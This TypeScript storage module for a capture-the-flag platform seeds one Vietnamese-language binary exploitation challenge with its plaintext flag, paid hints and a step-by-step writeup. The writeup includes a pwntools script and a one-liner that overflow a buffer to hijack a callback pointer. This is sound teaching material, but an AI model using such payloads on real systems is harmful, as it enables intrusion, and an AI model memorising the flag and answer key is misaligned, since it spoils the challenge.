import { 
  type Challenge, 
  type InsertChallenge, 
  type Hint, 
  type InsertHint,
  type Submission,
  type InsertSubmission,
  type WriteupSection,
  type InsertWriteupSection
} from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getChallenge(id: string): Promise<Challenge | undefined>;
  createChallenge(challenge: InsertChallenge): Promise<Challenge>;
  updateChallengeSolves(id: string, solves: number): Promise<void>;
  
  getHintsByChallenge(challengeId: string): Promise<Hint[]>;
  createHint(hint: InsertHint): Promise<Hint>;
  
  createSubmission(submission: InsertSubmission): Promise<Submission>;
  getSubmissionsByChallenge(challengeId: string): Promise<Submission[]>;
  
  getWriteupSectionsByChallenge(challengeId: string): Promise<WriteupSection[]>;
  createWriteupSection(section: InsertWriteupSection): Promise<WriteupSection>;
  
  getUnlockedHints(sessionId: string, challengeId: string): Promise<string[]>;
  unlockHint(sessionId: string, challengeId: string, hintId: string): Promise<void>;
}

export class MemStorage implements IStorage {
  private challenges: Map<string, Challenge>;
  private hints: Map<string, Hint>;
  private submissions: Map<string, Submission>;
  private writeupSections: Map<string, WriteupSection>;
  private unlockedHints: Map<string, Set<string>>;

  constructor() {
    this.challenges = new Map();
    this.hints = new Map();
    this.submissions = new Map();
    this.writeupSections = new Map();
    this.unlockedHints = new Map();
    
    this.seedData();
  }

  private seedData() {
    const stacklessStackId = "stackless-stack";
    
    const challenge: Challenge = {
      id: stacklessStackId,
      title: "Stackless Stack",
      description: `Binary x86-64 không có stack (dùng mmap + syscall để thay thế).

Lỗi buffer overflow nhưng không có ret.

Bạn cần khai thác lỗ hổng này để lấy flag. Challenge này yêu cầu kiến thức sâu về ROP chain và kỹ thuật exploitation nâng cao.

Điểm đặc biệt: Binary này không sử dụng stack truyền thống, thay vào đó dùng mmap để cấp phát vùng nhớ và syscall để thực thi. Điều này tạo ra một môi trường exploitation hoàn toàn khác biệt so với các binary thông thường.`,
      category: "pwn",
      difficulty: "master hacker",
      points: 500,
      flag: "VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}",
      author: "F12FLASH",
      solves: 0,
    };
    
    this.challenges.set(stacklessStackId, challenge);
    
    const hints: InsertHint[] = [
      {
        challengeId: stacklessStackId,
        order: 1,
        content: "Phân tích binary với 'nm' hoặc 'objdump' để tìm địa chỉ các hàm quan trọng. Đặc biệt chú ý đến hàm win_function tại 0x401390 và cấu trúc memory_region_t.",
        pointsCost: 50,
      },
      {
        challengeId: stacklessStackId,
        order: 2,
        content: "Cấu trúc memory_region_t có: data[256 bytes] + callback pointer[8 bytes] + magic[8 bytes]. Overflow buffer để ghi đè callback pointer tại offset 256.",
        pointsCost: 100,
      },
      {
        challengeId: stacklessStackId,
        order: 3,
        content: "Ghi đè callback pointer với địa chỉ win_function (0x401390) và giữ magic value = 0xdeadbeef. Binary sẽ tự động gọi win_function khi kiểm tra magic value.",
        pointsCost: 150,
      },
    ];
    
    hints.forEach(hint => {
      const id = randomUUID();
      this.hints.set(id, { id, ...hint });
    });
    
    const writeupSections: InsertWriteupSection[] = [
      {
        challengeId: stacklessStackId,
        order: 1,
        title: "Reconnaissance - Phân tích Binary",
        content: `Bước đầu tiên là phân tích binary để hiểu rõ về cấu trúc, bảo vệ và các hàm quan trọng.

Công cụ phân tích:
- file: Xác định loại file và kiến trúc
- nm/objdump: Tìm địa chỉ các hàm
- readelf: Xem thông tin ELF header
- strings: Tìm chuỗi ký tự trong binary

Kết quả quan trọng:
- Binary: ELF 64-bit x86-64, dynamically linked, not stripped
- Bảo vệ: NX enabled, No PIE, No stack canary
- Các hàm quan trọng:
  • win_function: 0x401390 (hàm đọc flag)
  • process_data: 0x401320 (callback mặc định)
  • vulnerable_function: 0x4015d0 (hàm có lỗ hổng)`,
        codeBlock: `$ file stackless_stack
stackless_stack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, not stripped

$ nm stackless_stack | grep -E "(win|process|vulnerable)"
0000000000401320 T process_data
00000000004015d0 T vulnerable_function
0000000000401390 T win_function

$ readelf -h stackless_stack | grep "Entry point"
  Entry point address:               0x401220`,
        language: "bash",
      },
      {
        challengeId: stacklessStackId,
        order: 2,
        title: "Vulnerability Analysis - Phân tích cấu trúc dữ liệu",
        content: `Phân tích source code (stackless_stack.c) để hiểu cấu trúc memory_region_t:

typedef struct {
    char data[BUFFER_SIZE];      // 0x100 bytes (256 bytes)
    void (*callback)(char*);     // 8 bytes (function pointer)
    unsigned long magic;         // 8 bytes (0xdeadbeef)
} memory_region_t;

LỖ HỔNG: vulnerable_function() đọc MAX_INPUT (0x600 = 1536 bytes) vào buffer chỉ có 256 bytes!
- Offset 0-255: data buffer
- Offset 256-263: callback pointer (có thể ghi đè!)
- Offset 264-271: magic value (phải = 0xdeadbeef)

Điều kiện trigger:
- Line 174-176 trong source: Nếu magic == 0xdeadbeef và callback != NULL, 
  binary sẽ gọi callback(region->data)

CHIẾN LƯỢC: Overflow buffer → ghi đè callback → trỏ đến win_function!`,
        codeBlock: `// Từ stackless_stack.c - vulnerable_function()
#define BUFFER_SIZE 0x100    // 256 bytes
#define MAX_INPUT   0x600    // 1536 bytes - OVERFLOW!

ssize_t bytes_read = read(STDIN_FILENO, region->data, MAX_INPUT);
// Đọc 1536 bytes vào buffer 256 bytes → Buffer Overflow!

// Điều kiện trigger callback (line 174-176)
if (region->magic == MAGIC_VALUE && region->callback != NULL) {
    region->callback(region->data);  // Gọi callback!
}

// Memory Layout
// +0x000: data[256]
// +0x100: callback pointer (8 bytes) ← GHI ĐÈ ĐÂY!
// +0x108: magic (8 bytes) = 0xdeadbeef`,
        language: "c",
      },
      {
        challengeId: stacklessStackId,
        order: 3,
        title: "Xây dựng Payload - Tính toán Offset",
        content: `Bây giờ chúng ta biết:
1. win_function tại địa chỉ: 0x401390
2. Callback pointer tại offset: 256 (0x100)
3. Magic value tại offset: 264 (0x108)

Payload structure:
- Bytes 0-255: Padding (256 bytes bất kỳ)
- Bytes 256-263: Địa chỉ win_function (0x0000000000401390 - little endian)
- Bytes 264-271: Magic value (0x00000000deadbeef - little endian)

LƯU Ý: x86-64 sử dụng little endian, địa chỉ phải được đảo ngược byte order.
Little endian của 0x401390 = \\x90\\x13\\x40\\x00\\x00\\x00\\x00\\x00`,
        codeBlock: `# Tìm gadgets có sẵn trong binary
$ ROPgadget --binary stackless_stack --only "pop|ret"
0x0000000000401205 : pop r12 ; ret
0x00000000004012ed : pop rbp ; ret
0x0000000000401203 : pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000401520 : pop rbx ; ret
0x000000000040101a : ret

# QUAN TRỌNG: Binary này KHÔNG CẦN ROP chain phức tạp!
# Chỉ cần ghi đè callback pointer là đủ.

# Cấu trúc memory
Offset 0x000: [256 bytes data buffer]
Offset 0x100: [callback pointer] ← Ghi đè = 0x401390
Offset 0x108: [magic value]     ← Giữ nguyên = 0xdeadbeef`,
        language: "bash",
      },
      {
        challengeId: stacklessStackId,
        order: 4,
        title: "Exploit Implementation - Python Script",
        content: `Viết exploit script hoàn chỉnh sử dụng pwntools.

Chiến lược đơn giản:
1. Tạo 256 bytes padding
2. Ghi đè callback pointer = 0x401390 (win_function)
3. Ghi đè magic value = 0xdeadbeef
4. Gửi payload và nhận flag!

KHÔNG CẦN ROP CHAIN phức tạp vì:
- Binary tự động gọi callback khi magic value match
- win_function đã có sẵn để đọc flag
- Chỉ cần redirect callback pointer là đủ`,
        codeBlock: `#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './stackless_stack'
win_addr = 0x401390      # Địa chỉ win_function
magic_value = 0xdeadbeef # Magic value cần giữ nguyên

# Create payload
payload = b'A' * 256                    # Padding 256 bytes
payload += p64(win_addr)                # Ghi đè callback → win_function
payload += p64(magic_value)             # Giữ magic = 0xdeadbeef

# Local exploit
if __name__ == '__main__':
    # Uncomment để test local
    # p = process(binary)
    
    # Uncomment để attack remote
    # p = remote('host', port)
    
    # Hoặc test bằng cách ghi vào file
    with open('payload.bin', 'wb') as f:
        f.write(payload)
    
    print(f"[+] Payload size: {len(payload)} bytes")
    print(f"[+] Win function: {hex(win_addr)}")
    print(f"[+] Payload saved to payload.bin")
    print(f"[+] Test: ./stackless_stack < payload.bin")
    
    # p.sendline(payload)
    # p.interactive()`,
        language: "python",
      },
      {
        challengeId: stacklessStackId,
        order: 5,
        title: "Testing và Getting the Flag",
        content: `Sau khi tạo payload, test exploit để lấy flag!

CÁCH 1: Test với file payload
Tạo payload binary file và pipe vào binary:
python3 exploit.py → Tạo payload.bin
./stackless_stack < payload.bin → Chạy với payload

CÁCH 2: Test với pwntools
Uncomment dòng p = process(binary) trong script
Chạy python3 exploit.py

CÁCH 3: Manual payload với Python
Tạo payload trực tiếp bằng Python one-liner

Kết quả mong đợi:
- Binary sẽ in ra: "[🎯] FLAG CAPTURED: VNFLAG{...}"
- win_function sẽ đọc flag từ /tmp/flag.txt
- Nếu không có flag file, sẽ in demo flag

Congratulations! Bạn đã hoàn thành challenge bằng cách khai thác buffer overflow và hijack function pointer - một kỹ thuật cơ bản nhưng quan trọng trong binary exploitation!`,
        codeBlock: `# Method 1: Sử dụng script Python
$ python3 exploit.py
[+] Payload size: 272 bytes
[+] Win function: 0x401390
[+] Payload saved to payload.bin
[+] Test: ./stackless_stack < payload.bin

$ ./stackless_stack < payload.bin
[🎯] FLAG CAPTURED: VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}

# Method 2: Manual Python one-liner
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*256 + b'\\x90\\x13\\x40\\x00\\x00\\x00\\x00\\x00' + b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00')" | ./stackless_stack

# Verify exploit worked
$ echo $?
0

# Flag format: VNFLAG{...}`,
        language: "bash",
      },
    ];
    
    writeupSections.forEach(section => {
      const id = randomUUID();
      this.writeupSections.set(id, { 
        id, 
        ...section,
        codeBlock: section.codeBlock ?? null,
        language: section.language ?? null
      });
    });
  }

  async getChallenge(id: string): Promise<Challenge | undefined> {
    return this.challenges.get(id);
  }

  async createChallenge(insertChallenge: InsertChallenge): Promise<Challenge> {
    const id = randomUUID();
    const challenge: Challenge = { 
      ...insertChallenge, 
      id,
      solves: insertChallenge.solves ?? 0
    };
    this.challenges.set(id, challenge);
    return challenge;
  }

  async updateChallengeSolves(id: string, solves: number): Promise<void> {
    const challenge = this.challenges.get(id);
    if (challenge) {
      challenge.solves = solves;
      this.challenges.set(id, challenge);
    }
  }

  async getHintsByChallenge(challengeId: string): Promise<Hint[]> {
    return Array.from(this.hints.values())
      .filter(hint => hint.challengeId === challengeId)
      .sort((a, b) => a.order - b.order);
  }

  async createHint(insertHint: InsertHint): Promise<Hint> {
    const id = randomUUID();
    const hint: Hint = { id, ...insertHint };
    this.hints.set(id, hint);
    return hint;
  }

  async createSubmission(insertSubmission: InsertSubmission): Promise<Submission> {
    const id = randomUUID();
    const submission: Submission = { 
      id, 
      ...insertSubmission, 
      timestamp: new Date() 
    };
    this.submissions.set(id, submission);
    return submission;
  }

  async getSubmissionsByChallenge(challengeId: string): Promise<Submission[]> {
    return Array.from(this.submissions.values())
      .filter(sub => sub.challengeId === challengeId)
      .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }

  async getWriteupSectionsByChallenge(challengeId: string): Promise<WriteupSection[]> {
    return Array.from(this.writeupSections.values())
      .filter(section => section.challengeId === challengeId)
      .sort((a, b) => a.order - b.order);
  }

  async createWriteupSection(insertSection: InsertWriteupSection): Promise<WriteupSection> {
    const id = randomUUID();
    const section: WriteupSection = { 
      id, 
      ...insertSection,
      codeBlock: insertSection.codeBlock ?? null,
      language: insertSection.language ?? null
    };
    this.writeupSections.set(id, section);
    return section;
  }

  async getUnlockedHints(sessionId: string, challengeId: string): Promise<string[]> {
    const key = `${sessionId}:${challengeId}`;
    const unlocked = this.unlockedHints.get(key);
    return unlocked ? Array.from(unlocked) : [];
  }

  async unlockHint(sessionId: string, challengeId: string, hintId: string): Promise<void> {
    const allHints = await this.getHintsByChallenge(challengeId);
    const hint = allHints.find(h => h.id === hintId);
    
    if (!hint) {
      throw new Error("Hint not found for this challenge");
    }
    
    if (hint.challengeId !== challengeId) {
      throw new Error("Hint does not belong to this challenge");
    }
    
    const key = `${sessionId}:${challengeId}`;
    let unlocked = this.unlockedHints.get(key);
    
    if (!unlocked) {
      unlocked = new Set();
      this.unlockedHints.set(key, unlocked);
    }
    
    unlocked.add(hintId);
  }
}

export const storage = new MemStorage();
